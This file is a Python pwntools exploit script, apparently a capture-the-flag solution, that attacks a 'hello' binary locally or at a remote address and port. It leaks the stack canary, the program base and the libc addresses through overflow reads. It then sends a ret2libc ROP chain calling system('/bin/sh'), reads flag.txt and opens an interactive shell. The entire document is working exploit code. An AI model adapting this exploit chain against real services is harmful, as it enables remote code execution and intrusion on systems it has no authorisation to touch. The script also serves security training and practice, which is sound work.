#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import CDLL
import sys, random

context.arch = 'amd64'
context.os = 'linux'

exe = '../hello/hello'
port = 30174

elf = ELF(exe)
libc = elf.libc
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('140.113.24.241', port)

r.recvuntil(b'choice:\n')
r.send(b'1\n')
r.recvuntil(b'> ')

# leak canary
offset = 0x28
payload = b'A' * (offset) + b'\n'

r.send(payload)
raw = r.recv()
CANARY = raw.split(b'to ')[1].split(b' (')[0].split(b'\n')[1][:7].rjust(8, b'\x00')

r.send(b'n')
r.recvuntil(b'> ')

# leak base address
payload = b'A' * (offset + 0xf) + b'\n'
r.send(payload)
raw = r.recv()
ret = u64(raw.split(b'to ')[1].split(b' (')[0].split(b'\n')[1].ljust(8, b'\x00'))
print(raw)
elf.address = ret - off_main - 153

r.send(b'n')
r.recvuntil(b'> ')

# get libc leak
LIBC_OFFSET = 0x29d90

payload = flat(
    'A' * 0x57,
    '\n',
)

r.send(payload)
raw = r.recv()
leak = u64(raw.split(b'to ')[1].split(b' (Y/N')[0].split(b'\n')[1].ljust(8, b'\x00'))
libc.address = leak - LIBC_OFFSET

r.send(b'n')
r.recvuntil(b'> ')

# pwn
RET = libc.address + 0x29139 # + 0x101a
POPRDI = libc.address + 0x2a3e5

payload = flat(
    b'\x00' * offset,
    CANARY,
    b'B' * 8,
    p64(POPRDI).ljust(8, b'\x00'),
    next(libc.search(b'/bin/sh\x00')),
    p64(RET).ljust(8, b'\x00'),
    p64(libc.sym['system']),
)

print(payload)
r.send(payload)
r.recvuntil(b')')
r.send(b'y')
r.recvuntil(b'Name changed!\n')
r.send(b'cat flag.txt\n')
flag = r.recv().decode()

success(flag)
r.interactive()

